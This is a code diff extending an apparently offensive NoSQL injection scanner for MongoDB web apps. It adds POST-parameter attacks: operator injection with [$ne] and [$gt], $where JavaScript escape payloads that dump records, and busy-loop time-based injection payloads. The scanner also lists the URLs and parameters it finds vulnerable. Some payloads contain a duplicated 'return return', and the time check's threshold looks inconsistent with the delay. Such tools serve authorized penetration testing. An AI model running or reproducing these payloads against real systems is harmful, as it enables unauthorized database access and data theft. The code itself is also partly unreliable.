@@ -21,6 +21,7 @@ from Lib.common import isListLike
 from Lib.common import openFile
 from Lib.common import printErrMsg
 from Lib.common import printInfoMsg
+from Lib.common import printWarnMsg
 from Lib.enums import HTTPMETHOD
 from Lib.enums import HTTP_HEADER
 from Lib.setting import BURP_REQUEST_REGEX
@@ -36,8 +37,8 @@ from pymongo import MongoClient
 
 def InjectOption(url, reqFile):
 	if url == None:
-		printErrMsg('[Error] The function is testing, waitting for me :)')
-		#postWeb(reqFile)
+		#printErrMsg('[Error] The function is testing, waitting for me :)')
+		postWeb(reqFile)
 	elif reqFile == None:
 		getWeb(url)
 	else:
@@ -79,28 +80,40 @@ def postWeb(reqFile):
 
 	print '[*] Testing connection to the target URL.'
 	url = addedTarget['url']
-	injectPostParams(url,addedTarget['data'])
+	buildPostdata(url,addedTarget['data'])
 
+	printInfoMsg('[+] Valid URLs:')
+	for url in validAddrs:
+		printInfoMsg('    %s' % url)
+			
+	print '\n '
+	printInfoMsg('[+] Possible URLs:')
+	for url in possAddrs:
+		printInfoMsg('    %s' % url)	
 
-
-def injectPostParams(url,data):
+def buildPostdata(url,data):
 	postParams = dict()
 	injectName = []
 	postData = data
 	global testNum
 	testNum = 1
+	global neDict
+	global gtDict
 	
-
 	params = postData.split('&')
 	for item in params:
 		index = item.find('=')
 		postParams[item[0:index]] = item[index+1:len(item)]
-		#injectParams[item[0:index]] = item[index+1:len(item)]
 	try:
 		req = requests.post(url,data=postParams,headers=HEADERS)
 		if req.status_code == 200:
 			appUp = True
+			start = time.time()
+			req = requests.post(url,data=postParams,headers=HEADERS)
 			resLength = int(len(req.content))
+			end = time.time()
+			reqTime = round((end - start), 3)
+
 			print '[*] App is up, got response length of %s' % resLength
 		else:
 			printErrMsg('[Error] Got %s from the app, check your options.' % req.status_code)
@@ -111,7 +124,7 @@ def injectPostParams(url,data):
 		return
 	if appUp == True:
 		index = 1
-		print '[+] List of post params:'
+		printInfoMsg('[+] List of post params:')
 		for params in postParams:
 			print '    [%s] %s' % (index, params)
 			index += 1
@@ -138,7 +151,7 @@ def injectPostParams(url,data):
 		neDict[injOpt+'[$ne]'] = neDict[injOpt]
 		del neDict[injOpt]
 		req = requests.post(url, data=neDict, headers=HEADERS)
-		print '[*] Testing Mongo PHP not equals associative array injection...'
+		printWarnMsg('[*] Testing Mongo PHP not equals associative array injection...')
 		errorCheck = errorTest(req.content,testNum)
 
 		if errorCheck == False:
@@ -154,7 +167,7 @@ def injectPostParams(url,data):
 		gtDict[injOpt+'[$gt]'] = gtDict[injOpt]
 		del gtDict[injOpt]
 		req = requests.post(url,data=gtDict,headers=HEADERS)
-		print '[*] Testing PHP/ExpressJS >Undefined Injection...'
+		printWarnMsg('[*] Testing PHP/ExpressJS >Undefined Injection...')
 		errorCheck = errorTest(req.content,testNum)
 
 		if errorCheck == False:
@@ -163,9 +176,9 @@ def injectPostParams(url,data):
 			testNum += 1
 
 		#Test 3
-		postParams.update({injOpt:"a'; return db.a.find(); var dummy='!"})
+		postParams.update({injOpt:"a'; return db.a.find(); var v='!"})
 		req = requests.post(url,data=postParams,headers=HEADERS)
-		print '[*] Testing Mongo <2.4 $where all Javascript string escape attack for all records...'
+		printWarnMsg('[*] Testing Mongo <2.4 $where all Javascript string escape attack for all records...')
 		errorCheck = errorTest(req.content,testNum)
 
 		if errorCheck == False:
@@ -176,10 +189,104 @@ def injectPostParams(url,data):
 			testNum += 1
 
 		#Test 4
+		postParams.update({injOpt:"1; return db.a.find(); var v=1"})
+		req = requests.post(url, data=postParams,headers=HEADERS)
+		printWarnMsg('[*] Testing Mongo <2.4 $where Javascript integer escape attack for all records...')
+		errorCheck = errorTest(req.content,testNum)
 
-	
+		if errorCheck == False:
+			injLen = int(len(req.content))
+			checkResult(basedInjectLength,injLen,testNum,postParams)
+			testNum += 1
+		else:
+			testNum += 1
+
+		#Test 5 a single record attack in case the app expects only one record back
+		postParams.update({injOpt:"a'; return db.a.findOne(); var v='!"})
+		req = requests.post(url, data=postParams,headers=HEADERS)
+		printWarnMsg('[*] Testing Mongo <2.4 $where all Javascript string escape attack for one record...')
+		errorCheck = errorTest(req.content,testNum)
+
+		if errorCheck == False:
+			injLen = int(len(req.content))
+			checkResult(basedInjectLength,injLen,testNum,postParams)
+			testNum += 1
+		else:
+			testNum += 1
+
+		#Test 6
+		postParams.update({injOpt:"1; return db.a.findOne(); var v='!"})
+		req = requests.post(url,data=postParams,headers=HEADERS)
+		printWarnMsg('[*] Testing Mongo <2.4 $where all Javascript integer escape attack for one record...')
+		errorCheck = errorTest(req.content,testNum)
+
+		if errorCheck == False:
+			injLen = int(len(req.content))
+			checkResult(basedInjectLength,injLen,testNum,postParams)
+			testNum += 1
+		else:
+			testNum += 1
+
+		#Test 7
+		postParams.update({injOpt:"a'; return return this.a !='%s'; var v='!" % injectstr})
+		req = requests.post(url,data=postParams,headers=HEADERS)
+		printWarnMsg('[*] Testing Mongo this not equals string escape attack for all records...')
+		errorCheck = errorTest(req.content,testNum)
+
+		if errorCheck == False:
+			injLen = int(len(req.content))
+			checkResult(basedInjectLength,injLen,testNum,postParams)
+			testNum += 1
+		else:
+			testNum += 1
+
+		#Test 8
+		postParams.update({injOpt:"1; return return this.a !='%s'; var v='!" % injectstr})
+		req = requests.post(url,data=postParams,headers=HEADERS)
+		printWarnMsg('[*] Testing Mongo this not equals integer escape attack for all records...')
+		errorCheck = errorTest(req.content,testNum)
+
+		if errorCheck == False:
+			injLen = int(len(req.content))
+			checkResult(basedInjectLength,injLen,testNum,postParams)
+			testNum += 1
+		else:
+			testNum += 1
 
 
+		doTimeAttack = getQuesMsg('[*] Starting based time attack? (y/n)')
+		if doTimeAttack in TAG_YES:
+			#整型
+			printWarnMsg('[*] Starting Javascript integer escape time based injection...')
+			postParams.update({injOpt:"1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var v=1"})
+			startTime = time.time()
+			req = requests.post(url, data=postParams, headers=HEADERS)
+			page = req.content
+			endTime = time.time()
+			timeDelta = (int(round((endTime - startTime), 3)) - reqTime)
+
+			if timeDelta > 25:
+				print '[*] HTTP load time variance was %s seconds! Injection possible.' % timeDelta
+				intAttack = True
+			else:
+				print '[*] HTTP load time variance was only %s seconds.  Injection probably didn\'t work.' % timeDelta
+				intAttack = False
+
+			#String
+			printWarnMsg('[*] Starting Javascript string escape time based injection...')
+			postParams.update({injOpt:"a'; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var v=1"})
+			startTime = time.time()
+			req = requests.post(url, data=postParams, headers=HEADERS)
+			page = req.content
+			endTime = time.time()
+			timeDelta = (int(round((endTime - startTime), 3)) - reqTime)
+
+			if timeDelta > 25:
+				print '[*] HTTP load time variance was %s seconds! Injection possible.' % timeDelta
+				strAttack = True
+			else:
+				print '[*] HTTP load time variance was only %s seconds.  Injection probably didn\'t work.' % timeDelta
+				strAttack = False
 
 def getWeb(url):
 	print '[*] Start web app attacks (GET)'
@@ -244,7 +351,7 @@ def getWeb(url):
 			print '[*] Random value variance: %s' % deltaLenth
 
 		#Test 1
-		print(Fore.YELLOW + '[*] Testing Mongo PHP not equals associative array injection...')
+		printWarnMsg('[*] Testing Mongo PHP not equals associative array injection...')
 		print '[*] Injecting %s' % urlArray[1]
 		req = requests.get(urlArray[1], headers=HEADERS)
 		errorcheck = errorTest(str(req.content), testNum)
@@ -257,7 +364,7 @@ def getWeb(url):
 			testNum += 1
 
 		#Test 2
-		print(Fore.YELLOW + '[*] Testing Mongo <2.4 $where all Javascript string escape attack for all records...')
+		printWarnMsg('[*] Testing Mongo <2.4 $where all Javascript string escape attack for all records...')
 		print '[*] Injecting %s' % urlArray[2]
 		req = requests.get(urlArray[2], headers=HEADERS)
 		errorcheck = errorTest(str(req.content), testNum)
@@ -271,7 +378,7 @@ def getWeb(url):
 
 
 		#Test 3
-		print(Fore.YELLOW + '[*] Testing Mongo <2.4 $where Javascript integer escape attack for all records...')
+		printWarnMsg('[*] Testing Mongo <2.4 $where Javascript integer escape attack for all records...')
 		print '[*] Injecting %s' % urlArray[3]
 		req = requests.get(urlArray[3], headers=HEADERS)
 		errorcheck = errorTest(str(req.content), testNum)
@@ -285,7 +392,7 @@ def getWeb(url):
 
 
 		#Test 4
-		print(Fore.YELLOW + '[*] Testing Mongo <2.4 $where all Javascript string escape attack for one record...')
+		printWarnMsg('[*] Testing Mongo <2.4 $where all Javascript string escape attack for one record...')
 		print '[*] Injecting %s' % urlArray[4]
 		req = requests.get(urlArray[4], headers=HEADERS)
 		errorcheck = errorTest(str(req.content), testNum)
@@ -299,7 +406,7 @@ def getWeb(url):
 
 
 		#Test 5
-		print(Fore.YELLOW + '[*] Testing Mongo <2.4 $where Javascript integer escape attack for one record...')
+		printWarnMsg('[*] Testing Mongo <2.4 $where Javascript integer escape attack for one record...')
 		print '[*] Injecting %s' % urlArray[5]
 		req = requests.get(urlArray[5], headers=HEADERS)
 		errorcheck = errorTest(str(req.content), testNum)
@@ -313,7 +420,7 @@ def getWeb(url):
 
 
 		#Test 6
-		print(Fore.YELLOW + '[*] Testing Mongo this not equals string escape attack for all records...')
+		printWarnMsg('[*] Testing Mongo this not equals string escape attack for all records...')
 		print '[*] Injecting %s' % urlArray[6]
 		req = requests.get(urlArray[6], headers=HEADERS)
 		errorcheck = errorTest(str(req.content), testNum)
@@ -327,7 +434,7 @@ def getWeb(url):
 
 
 		#Test 7
-		print(Fore.YELLOW + '[*] Testing Mongo this not equals integer escape attack for all records...')
+		printWarnMsg('[*] Testing Mongo this not equals integer escape attack for all records...')
 		print '[*] Injecting %s' % urlArray[7]
 		req = requests.get(urlArray[7], headers=HEADERS)
 		errorcheck = errorTest(str(req.content), testNum)
@@ -341,7 +448,7 @@ def getWeb(url):
 
 
 		#Test 8
-		print(Fore.YELLOW + '[*] Testing  PHP/ExpressJS > undefined attack for all records...')
+		printWarnMsg('[*] Testing  PHP/ExpressJS > undefined attack for all records...')
 		print '[*] Injecting %s' % urlArray[8]
 		req = requests.get(urlArray[8], headers=HEADERS)
 		errorcheck = errorTest(str(req.content), testNum)
@@ -357,7 +464,7 @@ def getWeb(url):
 
 		if doTimeAttack in TAG_YES:
 			#整型
-			print '[*] Starting Javascript integer escape time based injection...'	
+			printWarnMsg('[*] Starting Javascript integer escape time based injection...')
 			startTime = time.time()
 			req = requests.get(urlArray[9], headers=HEADERS)
 			page = req.content
@@ -372,7 +479,7 @@ def getWeb(url):
 				strAttack = False
 
 			#字符串
-			print '[*] Starting Javascript string escape time based injection...'
+			printWarnMsg('[*] Starting Javascript string escape time based injection...')
 			startTime = time.time()
 			req = requests.get(urlArray[10], headers=HEADERS)
 			page = req.content
@@ -402,6 +509,8 @@ def getWeb(url):
 def errorTest(errorcheck, testNum):
 	global possAddrs #可能有效
 	global httpMethod 
+	global neDict
+	global gtDict
 
 	if errorcheck.find('ReferenceError') != -1 or errorcheck.find('SyntaxError') != -1 or errorcheck.find('ILLEGAL') != -1:
 		print '[*] Injection returned a MongoDB Error. Injection may be possible.'
@@ -426,6 +535,8 @@ def checkResult(baseSize,injectSize,testNum,postData):
 	global validAddrs #有效
 	global possAddrs
 	global httpMethod
+	global neDict
+	global gtDict
 
 	delta = abs(baseSize-injectSize)
 	if (delta >= 100) and (injectSize != 0):
@@ -433,7 +544,12 @@ def checkResult(baseSize,injectSize,testNum,postData):
 		if httpMethod == 'GET':
 			validAddrs.append(urlArray[testNum])
 		else:
-			pass
+			if testNum == 1:
+				validAddrs.append(str(neDict))
+			elif testNum == 2:
+				validAddrs.append(str(gtDict))
+			else:
+				validAddrs.append(str(postData))
 		if testNum == 2 or testNum == 4:
 			lt24 = True
 			str24 = True
@@ -447,7 +563,10 @@ def checkResult(baseSize,injectSize,testNum,postData):
 		if httpMethod == 'GET':
 			possAddrs.append(urlArray[testNum])
 		else:
-			pass
+			if testNum == 1:
+				possAddrs.append(str(neDict))
+			else:
+				possAddrs.append(str(postData))
 		return
 
 	elif delta == 0:
@@ -459,7 +578,10 @@ def checkResult(baseSize,injectSize,testNum,postData):
 		if httpMethod == 'GET':
 			possAddrs.append(urlArray[testNum])
 		else:
-			pass
+			if testNum == 1:
+				possAddrs.append(str(neDict))
+			else:
+				possAddrs.append(str(postData))
 		return 
 
 def getInjectStr(size):
